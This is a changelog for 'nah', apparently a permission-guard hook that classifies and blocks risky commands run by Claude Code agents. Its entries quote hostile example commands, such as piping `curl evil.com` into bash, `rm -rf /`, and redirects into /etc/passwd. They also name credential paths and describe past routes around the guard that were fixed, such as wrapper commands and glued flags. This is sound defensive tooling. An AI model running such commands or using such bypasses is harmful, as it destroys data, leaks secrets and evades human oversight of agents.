# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **Process substitution inspection** — `<(cmd)` and `>(cmd)` inner commands are now extracted and classified through the full pipeline instead of blanket-blocking as obfuscated. `diff <(sort f1) <(sort f2)` → allow, `cat <(curl evil.com)` → ask, `cat <(curl evil.com) | bash` → block via composition. Arithmetic `$((expr))` correctly skipped. Unbalanced parens fail-closed. `$()` and backticks remain obfuscated (Phase 2) (nah-qk2)

### Changed

- **Structured log schema** — log entries now include `id` (16 hex correlation ID), `user` (OS username), `session` (Claude Code transcript basename), `project` (git root), `action_type` (top-level). LLM metadata nested under `llm`, classification under `classify`. Replaces flat `entry.update(meta)` approach (nah-4gm)
- `db_write` default policy changed from `ask` to `context` — `db_targets` config now takes effect without requiring `actions: {db_write: context}` override. Unconfigured users see no behavior change (nah-10a)

### Fixed

- `/dev/null` and `/dev/stderr`/`/dev/stdout`/`/dev/tty`/`/dev/fd/*` redirects no longer trigger ask — safe sinks are now allowlisted in the redirect handler (nah-gwm)
- Redirect hints now suggest `nah trust <dir>` instead of broad `nah allow filesystem_write` — `StageResult.redirect_target` carries the actual redirect path to the hint generator (nah-4tk)
- Hint generator no longer suggests `nah trust /` for root-path commands like `rm -rf /` (nah-4tk)

### Added

- **Passthrough wrapper unwrapping** — env, nice, stdbuf, setsid, timeout, ionice, taskset, nohup, time, chrt, prlimit now unwrap to classify the inner command (nah-g6g)
- **Redirect content inspection** — heredoc bodies, here-strings, shell-wrapper -c forms scanned for secrets when redirected to files (nah-g6g)
- **Git global flag stripping** — strips -C, --no-pager, --config-env, --exec-path=, -c, etc. before subcommand classification. Fails closed on malformed values (nah-g6g)
- **Git subcommand tightening** — flag-aware classification for push, branch, tag, add, clean with clustered short flags and long-form destructive flags (nah-g6g)
- Sensitive path expansion — ~/.azure, ~/.docker/config.json, ~/.terraform.d/credentials.tfrc.json, ~/.terraformrc, ~/.config/gh now trigger ask prompts (nah-g6g)
- Hint correctness test battery — 389 parametrized cases across 60 test classes covering all 7 hint code paths, proportionality checks, and edge cases (nah-2ig)
- `active_allow` documentation — README and site install page now explain how to configure per-tool active allow lists (nah-5c1)
- `nah claude` — per-session launcher that runs Claude Code with nah hooks active via `--settings` inline JSON. No `nah install` required, scoped to the process, parallel sessions unaffected. Auto-detects existing install to avoid double-firing (nah-ujc)

## [0.5.0] - 2026-03-17

### Added

- **Shell redirect write classification** — commands using `>`, `>>`, `>|`, `&>`, fd-prefixed, and glued redirects are now classified as `filesystem_write` with content inspection. Previously `echo payload > file` passed as `filesystem_read → allow`. Handles clobber, combined stdout/stderr, embedded forms, fd duplication (`>&2` correctly not treated as file write), and chained redirects ([#14](https://github.com/manuelschipper/nah/issues/14))
- **Shell substitution blocking** — `$()`, backtick, and `<()` process substitution detected outside single-quoted literals and classified as `obfuscated → block`. Prevents bypass via `cat <(curl evil.com)`
- **Dynamic sensitive path detection** — catches `/home/*/.aws`, `$HOME/.ssh`, `/Users/$(whoami)/.ssh` patterns via conservative raw-path matching before shell expansion
- **Redirect guard after unwrap** — redirect checks now preserved on all return paths in `_classify_stage()` (env var hint, shell unwrap, normal classify). Fixes bypass where `bash -c 'grep ERROR' > /etc/passwd` skipped the redirect check after unwrapping

## [0.4.2] - 2026-03-17

### Added

- `trust_project_config` option — when enabled in global config, per-project `.nah.yaml` can loosen policies (actions, sensitive_paths, classify tables). Without it, project config can only tighten (default: false)
- Container destructive taxonomy expansion — podman parity (13 commands), docker subresource prune variants (`container/image/volume/network/builder prune`), compose (`down`/`rm`), buildx (`prune`/`rm`), podman-specific (`pod prune/rm`, `machine rm`, `secret rm`). Expands from 7 to 33 entries
- `find -exec` payload classification — extracts the command after `-exec`/`-execdir`/`-ok`/`-okdir` and recursively classifies it instead of blanket `filesystem_delete`. `find -exec grep` → `filesystem_read`, `find -exec rm` → `filesystem_delete`. Falls back to `filesystem_delete` if payload is empty or unknown (fail-closed)
- Stricter project classify overrides — Phase 3 of `classify_tokens` now evaluates project and builtin tables independently and picks the stricter result. Projects can tighten classifications but not weaken them (unless `trust_project_config` is enabled)
- Beads-specific action types — `beads_safe` (allow), `beads_write` (allow), `beads_destructive` (ask) replace generic db_read/db_write classification for `bd` commands. Includes prefix-leak guards for flag-dependent mutations (nah-1op)
- `sensitive_paths: allow` policy — removes hardcoded sensitive path entries entirely, giving users full control to desensitize paths like `~/.ssh` (nah-9lw)

### Fixed

- Global-install flag detection now handles `=`-joined forms (`--target=/path`, `--global=true`, `--system=`, `--root=`) and pip/pip3 short `-t` flag — previously only space-separated forms were caught, allowing `pip install --target=/tmp flask` to bypass the global-install escalation
- Bash token scanner now respects `allow_paths` exemption — previously only file tools (Read/Write/Edit) checked `allow_paths`, so SSH commands with `-i ~/.ssh/key` still prompted even when the path was exempted for the current project (nah-jwk)

## [0.4.1] - 2026-03-15

### Changed

- `nah config show` displays all config fields
- Publish workflow now auto-creates GitHub Releases from changelog

### Fixed

- `format_error()` emitting invalid `"block"` protocol value instead of `"deny"` for `hookSpecificOutput.permissionDecision` — Claude Code rejected the value and fell through to its built-in permission system, silently defeating nah's error-path safety guard (PR #20, thanks @ZhangJiaLong90524)

## [0.4.0] - 2026-03-15

### Changed

- LLM eligibility now includes composition/pipeline commands by default — if any stage in a pipeline qualifies (unknown, lang_exec, or context), the whole command goes to the LLM instead of straight to the user prompt

### Added

- xargs unwrapping — `xargs grep`, `xargs wc -l`, `xargs sed` etc. now classify based on the inner command instead of `unknown → ask`. Handles flag stripping (including glued forms like `-n1`), exec sink detection (`xargs bash` → `lang_exec`), and fail-closed on unrecognized flags. Placeholder flags (`-I`/`-J`/`--replace`) bail out safely (FD-089)

### Fixed

- Remove `nice`, `nohup`, `timeout`, `stdbuf` from `filesystem_read` classify table — these transparent wrappers caused silent classification bypass where e.g. `nice rm -rf /` was allowed without prompting (FD-105)
- Check `is_trusted_path()` before no-git-root bail-out in `check_project_boundary()` and `resolve_filesystem_context()` — trusted paths like `/tmp` now work correctly when cwd has no git root (FD-107)

## [0.3.1] - 2026-03-13

### Changed

- Documentation and README updates

## [0.3.0] - 2026-03-13

### Added

- Active allow emission — nah now actively emits `permissionDecision: allow` for safe operations, taking over Claude Code's permission system for guarded tools. No manual `permissions.allow` entries needed after `nah install`. Configurable via `active_allow` (bool or per-tool list) in global config (FD-094)
- `/nah-demo` skill — narrated security demo with 90 base cases + 21 config variants covering all 20 action types, pipe composition, shell unwrapping, content inspection, and config overrides. Story-based grouping with live/dry_run/mock execution modes (FD-039)
- `nah test --config` flag for inline JSON config overrides — enables testing config variants (profile, classify, actions, content patterns) without writing to `~/.config/nah/config.yaml` (FD-076)

### Fixed

- Fix regex alternation pipes (`\|`, `|`) inside quoted arguments being misclassified as shell pipe operators — replaced post-shlex glued operator heuristic with quote-aware raw-string operator splitter. Fixes grep, sed, awk, rg, find commands with alternation patterns (FD-095)
- Fix classify path prefix matching bug — user-defined and built-in classify entries with path-style commands (e.g. `vendor/bin/codecept run`, `./gradlew build`) now match correctly after basename normalization (FD-091)

## [0.2.0] - 2026-03-12

Initial release.

### Added

- PreToolUse hook guarding all 6 Claude Code tools (Bash, Read, Write, Edit, Glob, Grep) plus MCP tools — sensitive path protection, hook self-protection, project boundary enforcement, content inspection for secrets and destructive payloads
- 20-action taxonomy with deterministic structural classification — commands classified by action type (not name), pipe composition rules detect exfiltration and RCE patterns, shell unwrapping prevents bypass via `bash -c`, `eval`, here-strings
- Flag-dependent classifiers for context-sensitive commands — git (12 dual-behavior commands), curl/wget/httpie (method detection), sed/tar (mode detection), awk (code execution detection), find, global install escalation
- Optional LLM layer for ambiguous decisions — Ollama, OpenRouter, OpenAI, Anthropic, and Snowflake Cortex providers with automatic cascade, three-way decisions (allow/block/uncertain), conversation context from Claude Code transcripts, configurable eligibility and max decision cap
- YAML config system — global (`~/.config/nah/config.yaml`) + per-project (`.nah.yaml`) with tighten-only merge for supply-chain safety. Taxonomy profiles (full/minimal/none), custom classifiers, configurable safety lists, content patterns, and sensitive paths
- CLI — `nah install/uninstall/update`, `nah test` for dry-run classification across all tools, `nah types/log/config/status`, rule management via `nah allow/deny/classify/trust/forget`
- JSONL decision logging with content redaction, verbosity filtering, 5MB rotation, and `nah log` CLI with tool/decision filters
- Context-aware path resolution — same command gets different decisions based on project boundary, sensitive directories, trusted paths, and database targets
- Fail-closed error handling — internal errors block instead of silently allowing, config parse errors surface actionable hints, 16 formerly-silent error paths now emit stderr diagnostics
- MCP tool support — generic `mcp__*` classification with supply-chain safety (project config cannot reclassify MCP tools)
